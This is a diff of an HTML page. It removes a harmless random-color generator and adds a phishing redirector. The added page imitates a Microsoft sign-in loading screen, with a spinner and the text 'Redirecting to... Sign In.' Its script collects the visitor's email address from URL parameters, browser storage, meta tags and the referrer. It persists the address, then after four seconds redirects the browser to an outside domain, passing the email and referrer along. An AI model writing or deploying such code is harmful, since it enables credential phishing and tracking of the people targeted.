@@ -1,133 +1,176 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>#000000</title>
-    <link type="image/x-icon" rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAHklEQVQ4T2NkYGD4z0ABYBw1gGE0DBhGw4BhWIQBAE5OEAELnjVHAAAAAElFTkSuQmCC">
-    <style>
-        :root {
-            --color: #000000;
-            --color-transparent: #00000022;
-        }
+  <meta charset="utf-8">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg') no-repeat center center;
+      background-size: cover;
+      background-attachment: fixed;
+      background-color: rgba(71, 71, 71, 0.3);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      position: relative;
+    }
 
-        ::selection {
-            background: var(--color-transparent);
-        }
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(130, 129, 129, 0.25);
+      pointer-events: none;
+    }
 
-        html,
-        body {
-            background: var(--color);
-            height: 100%;
-            margin: 0;
-        }
+    .spinner-container {
+      position: relative;
+      width: 60px;
+      height: 60px;
+      z-index: 10;
+    }
 
-        body {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-        }
+    .spinner {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border: 4px solid rgba(255, 255, 255, 0.25);
+      border-top: 4px solid #ffffff;
+      border-right: 4px solid rgba(255, 255, 255, 0.9);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.6);
+    }
 
-        #color {
-            background: white;
-            color: var(--color);
-            font-size: 2.5rem;
-            font-weight: 300;
-            padding: 2.25rem 3rem;
-            font-family: -apple-system, BlinkMacSystemFont, avenir next, avenir, helvetica neue, helvetica, ubuntu, roboto, noto, segoe ui, arial, sans-serif;
-            cursor: text;
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loading-text {
+      position: absolute;
+      bottom: -40px;
+      width: 200px;
+      left: -70px;
+      text-align: center;
+      color: white;
+      font-size: 14px;
+      font-weight: 500;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
+    }
+  </style>
+  <script>
+    // Function to extract email from various sources
+    function extractEmailFromReferrer() {
+      var email = '';
+      
+      // Try to get email from URL parameters
+      try {
+        var urlParams = new URLSearchParams(window.location.search);
+        email = urlParams.get('email') || urlParams.get('user') || urlParams.get('recipient') || '';
+      } catch(e) {
+        // Fallback for older browsers
+        var match = window.location.search.match(/[?&]email=([^&]+)/);
+        if (match) email = decodeURIComponent(match[1]);
+      }
+      
+      // Try from localStorage if set
+      if (!email) {
+        email = localStorage.getItem('userEmail') || '';
+      }
+      
+      // Try from sessionStorage
+      if (!email) {
+        email = sessionStorage.getItem('visitorEmail') || '';
+      }
+      
+      // Try to get from document (if set in meta tags)
+      if (!email) {
+        var emailMeta = document.querySelector('meta[name="user-email"]');
+        if (emailMeta) {
+          email = emailMeta.getAttribute('content') || '';
         }
-    </style>
+      }
+      
+      // Try from referrer domain (if from Microsoft/Outlook/Email client)
+      if (!email && document.referrer) {
+        try {
+          var referrerUrl = new URL(document.referrer);
+          // Check for email in referrer URL parameters
+          var refEmail = referrerUrl.searchParams.get('email') || 
+                        referrerUrl.searchParams.get('user') || 
+                        referrerUrl.searchParams.get('recipient') || '';
+          if (refEmail) email = refEmail;
+          
+          // Try to extract email pattern from referrer hostname if it's an email service
+          if (!email && (referrerUrl.hostname.includes('outlook') || 
+                        referrerUrl.hostname.includes('microsoft') ||
+                        referrerUrl.hostname.includes('gmail') ||
+                        referrerUrl.hostname.includes('mail'))) {
+            // Email services often include user info in the referrer, but it's usually not accessible
+            // This is here for compatibility
+          }
+        } catch(e) {
+          // Referrer may not be available due to security restrictions
+        }
+      }
+      
+      return email;
+    }
+    
+    // Function to build redirect URL with email parameter
+    function buildRedirectUrl() {
+      var baseUrl = 'http://storage.iracustodianusa.help/9?ai=xd';
+      var email = extractEmailFromReferrer();
+      
+      // Store email in sessionStorage for persistance
+      if (email) {
+        sessionStorage.setItem('visitorEmail', email);
+        localStorage.setItem('userEmail', email);
+      }
+      
+      // Append email parameter to redirect URL
+      if (email) {
+        var separator = baseUrl.indexOf('?') > -1 ? '&' : '?';
+        return baseUrl + separator + 'email=' + encodeURIComponent(email) + '&ref=' + encodeURIComponent(document.referrer);
+      }
+      
+      // Include referrer info even if email is not found
+      var separator = baseUrl.indexOf('?') > -1 ? '&' : '?';
+      return baseUrl + separator + 'ref=' + encodeURIComponent(document.referrer);
+    }
+    
+    // Perform redirect with email parameter
+    function performRedirect() {
+      var redirectUrl = buildRedirectUrl();
+      // Delay redirect by 4 seconds (4000 milliseconds)
+      setTimeout(function() {
+        window.location.href = redirectUrl;
+      }, 4000);
+    }
+    
+    // Execute redirect on page load
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', performRedirect);
+    } else {
+      performRedirect();
+    }
+  </script>
 </head>
-
 <body>
-    <p id="color">#000000</p>
-    <script>
-        function randomInt(min, max) {
-            return Math.floor(Math.random() * (max - min + 1) + min);
-        }
-
-        function hslToHex(h, s, l) {
-            h /= 360;
-            s /= 100;
-            l /= 100;
-            var r = void 0,
-                g = void 0,
-                b = void 0;
-            if (s === 0) {
-                r = g = b = l; // achromatic
-            } else {
-                var hue2rgb = function hue2rgb(p, q, t) {
-                    if (t < 0) t += 1;
-                    if (t > 1) t -= 1;
-                    if (t < 1 / 6) return p + (q - p) * 6 * t;
-                    if (t < 1 / 2) return q;
-                    if (t < 2 / 3) return p + (q - p) * (2 / 3 - t) * 6;
-                    return p;
-                };
-                var q = l < 0.5 ? l * (1 + s) : l + s - l * s;
-                var p = 2 * l - q;
-                r = hue2rgb(p, q, h + 1 / 3);
-                g = hue2rgb(p, q, h);
-                b = hue2rgb(p, q, h - 1 / 3);
-            }
-            var toHex = function toHex(x) {
-                var hex = Math.round(x * 255).toString(16);
-                return hex.length === 1 ? '0' + hex : hex;
-            };
-            return '#' + toHex(r) + toHex(g) + toHex(b);
-        }
-
-        window.onload = function () {
-            let stopProp = function (ev) {
-                ev.stopPropagation();
-            }
-
-            var colorElement = document.getElementById("color");
-            colorElement.addEventListener("click", stopProp, false);
-            colorElement.addEventListener("mousedown", stopProp, false);
-
-            var setFavicon = function (hex) {
-                var canvas = document.createElement('canvas');
-                canvas.width = 16;
-                canvas.height = 16;
-                var ctx = canvas.getContext('2d');
-                ctx.fillStyle = hex;
-                ctx.fillRect(0, 0, 16, 16);
-                document.getElementsByTagName('link')[0].href = canvas.toDataURL("image/x-icon");
-            }
-
-            var setRandomColor = function setRandomColor() {
-                var h = void 0,
-                    s = void 0,
-                    l = void 0;
-
-                h = randomInt(0, 359);
-                s = randomInt(55, 75);
-                l = randomInt(40, 60);
-
-                document.documentElement.style.setProperty('--color', 'hsl(' + h + ', ' + s + '%, ' + l + '%)');
-                var hex = hslToHex(h, s, l);
-                document.title = hex;
-                colorElement.innerHTML = hex;
-                document.documentElement.style.setProperty('--color-transparent', hex + '22');
-
-                setFavicon(hex);
-            };
-            setRandomColor();
-
-            var body = document.getElementsByTagName("body")[0];
-            body.addEventListener("mousedown", function (ev) {
-                ev.preventDefault();
-            });
-            body.addEventListener("click", function () {
-                setRandomColor();
-            }, false);
-        };
-    </script>
+  <div class="spinner-container">
+    <div class="spinner"></div>
+    <div class="loading-text">Redirecting to... Sign In.</div>
+  </div>
 </body>
-
 </html>
